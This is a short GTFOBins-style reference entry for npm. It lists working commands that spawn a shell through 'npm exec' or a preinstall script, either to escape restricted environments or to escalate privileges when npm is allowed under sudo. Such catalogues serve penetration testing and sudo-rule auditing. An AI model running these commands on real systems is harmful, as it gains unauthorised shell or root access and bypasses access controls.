# GTFOBin: npm

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
npm exec /bin/sh
```

Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
npm -C $TF i
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```